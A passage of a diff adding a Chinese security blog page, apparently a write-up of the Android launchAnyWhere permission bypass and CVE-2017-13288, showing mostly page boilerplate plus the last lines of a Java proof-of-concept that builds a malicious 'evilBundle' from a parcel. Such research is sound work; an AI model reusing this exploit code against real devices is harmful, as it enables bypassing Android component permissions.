length);</span><br><span class="line">        bndlData.setDataPosition(0);</span><br><span class="line">        evilBundle.readFromParcel(bndlData);</span><br><span class="line">        Log.d(TAG, evilBundle.toString());</span><br><span class="line">        return evilBundle;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/08/02/BlueBorne蓝牙漏洞复现/" rel="next" title="BlueBorne蓝牙漏洞复现">
+                <i class="fa fa-chevron-left"></i> BlueBorne蓝牙漏洞复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Charlie</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">35</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Android-基础知识"><span class="nav-number">1.</span> <span class="nav-text">Android 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Activty"><span class="nav-number">1.1.</span> <span class="nav-text">Activty</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Intent"><span class="nav-number">1.2.</span> <span class="nav-text">Intent</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Parcelable"><span class="nav-number">1.3.</span> <span class="nav-text">Parcelable</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bundle"><span class="nav-number">1.4.</span> <span class="nav-text">Bundle</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#launchAnyWhere-Activity-组件权限绕过"><span class="nav-number">2.</span> <span class="nav-text">launchAnyWhere Activity 组件权限绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#AccountManagerService"><span class="nav-number">2.1.</span> <span class="nav-text">AccountManagerService</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2017-13288"><span class="nav-number">3.</span> <span class="nav-text">CVE-2017-13288</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc"><span class="nav-number">4.</span> <span class="nav-text">poc</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Charlie</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.4.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
